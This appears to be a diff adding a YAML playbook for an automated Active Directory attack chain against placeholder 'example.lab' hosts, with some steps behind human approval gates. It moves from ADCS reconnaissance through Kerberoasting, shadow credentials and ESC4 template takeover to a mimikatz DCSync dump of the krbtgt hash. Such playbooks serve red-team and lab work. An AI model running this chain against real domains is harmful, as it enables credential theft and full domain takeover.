@@ -1,0 +1,73 @@
+version: 1
+name: "Generic Active Directory Multi-Hop Privilege Escalation"
+
+nodes:
+  - id: "PE-01-RECON"
+    phase: 1.0
+    title: "Domain Reconnaissance & ADCS Attack Surface Audit"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    intent: "certipy.find"
+    intent_args:
+      target: "ca01.example.lab"
+      domain: "example.lab"
+      vulnerable: true
+    produces_cred: "adcs_audit_data"
+    success_marker: "PE_01_RECON_OK"
+
+  - id: "PE-02-KERBEROAST"
+    phase: 2.0
+    title: "Service Principal Name (SPN) Kerberoast Attack"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "adcs_audit_data"
+    intent: "rubeus.kerberoast"
+    intent_args:
+      dc: "dc01.example.lab"
+      domain: "example.lab"
+    produces_cred: "kerberoast_ticket"
+    success_marker: "PE_02_KERBEROAST_OK"
+
+  - id: "PE-03-SHADOWCREDS"
+    phase: 3.0
+    title: "Shadow Credentials Key Credential Link Injection"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "kerberoast_ticket"
+    intent: "shadowcreds.pywhiskey"
+    intent_args:
+      target: "dc01.example.lab"
+      domain: "example.lab"
+      action: "add"
+    produces_cred: "shadow_cred_cert"
+    hitl_gate: "acl_write"
+    success_marker: "PE_03_SHADOWCREDS_OK"
+
+  - id: "PE-04-CERTIPY-ESC4"
+    phase: 4.0
+    title: "ADCS ESC4 Vulnerable Template Write ACL Takeover"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "shadow_cred_cert"
+    intent: "certipy.template"
+    intent_args:
+      template: "ESC4-Template"
+      target: "ca01.example.lab"
+      domain: "example.lab"
+    produces_cred: "modified_template_acl"
+    hitl_gate: "acl_write"
+    success_marker: "PE_04_CERTIPY_ESC4_OK"
+
+  - id: "PE-05-DCSYNC"
+    phase: 5.0
+    title: "Directory Replication Service (DRS) DCSync Credential Dump"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "modified_template_acl"
+    intent: "mimikatz.dcsync"
+    intent_args:
+      user: "Administrator"
+      domain: "example.lab"
+    produces_cred: "krbtgt_nt_hash"
+    hitl_gate: "dcsync"
+    success_marker: "PE_05_DCSYNC_OK"
